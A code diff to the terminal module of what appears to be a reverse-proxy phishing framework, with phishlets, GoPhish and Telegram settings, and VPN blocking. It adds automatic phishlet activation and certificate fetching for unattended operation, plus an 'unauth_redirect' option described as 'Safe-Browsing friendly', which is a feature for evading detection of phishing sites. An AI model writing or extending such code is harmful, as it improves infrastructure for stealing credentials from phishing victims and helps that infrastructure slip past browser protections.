@@ -68,6 +68,13 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 	if err != nil {
 		return nil, err
 	}
+	// Activate phishlets marked as enabled in the saved configuration so
+	// headless (-noterm) mode serves them without an interactive terminal.
+	t.cfg.refreshActiveHostnames()
+	// Obtain ACME certificates for the active hostnames in the background so
+	// headless (-noterm) mode gets valid TLS certificates at startup instead
+	// of failing handshakes until an interactive terminal runs.
+	go t.manageCertificates(true)
 	return t, nil
 }
 
@@ -229,8 +236,12 @@ func (t *Terminal) handleConfig(args []string) error {
 		if t.cfg.GetTurnstileSiteKey() != "" {
 			turnstileDisplay = "on (sitekey: " + t.cfg.GetTurnstileSiteKey() + ")"
 		}
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "strip_headers", "dashboard_sub", "dashboard_user", "dashboard_pass", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken", "turnstile"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetStripHeadersStatus(), dashSub, dashUser, dashPassDisplay, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken, turnstileDisplay}
+		unauthRedirectDisplay := "off (render)"
+		if t.cfg.IsUnauthRedirectEnabled() {
+			unauthRedirectDisplay = "on (302)"
+		}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "unauth_redirect", "autocert", "strip_headers", "dashboard_sub", "dashboard_user", "dashboard_pass", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken", "turnstile"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, unauthRedirectDisplay, autocertOnOff, t.cfg.GetStripHeadersStatus(), dashSub, dashUser, dashPassDisplay, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken, turnstileDisplay}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -324,6 +335,17 @@ func (t *Terminal) handleConfig(args []string) error {
 			case "off":
 				t.cfg.SetStripHeaders(false)
 				return nil
+			}
+		case "unauth_redirect":
+			switch args[1] {
+			case "on":
+				t.cfg.SetUnauthRedirect(true)
+				return nil
+			case "off":
+				t.cfg.SetUnauthRedirect(false)
+				return nil
+			default:
+				return fmt.Errorf("usage: config unauth_redirect on|off")
 			}
 		case "blockvpn":
 			switch args[1] {
@@ -1854,6 +1876,7 @@ func (t *Terminal) createHelp() {
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("chatid"), readline.PcItem("teletoken"),
 			readline.PcItem("strip_headers", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("unauth_redirect", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
@@ -1862,6 +1885,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
+	h.AddSubCommand("config", []string{"unauth_redirect"}, "unauth_redirect <on|off>", "on: 302-redirect unauthorized/blocked visitors to unauth_url (Safe-Browsing friendly); off: serve a rendered copy")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
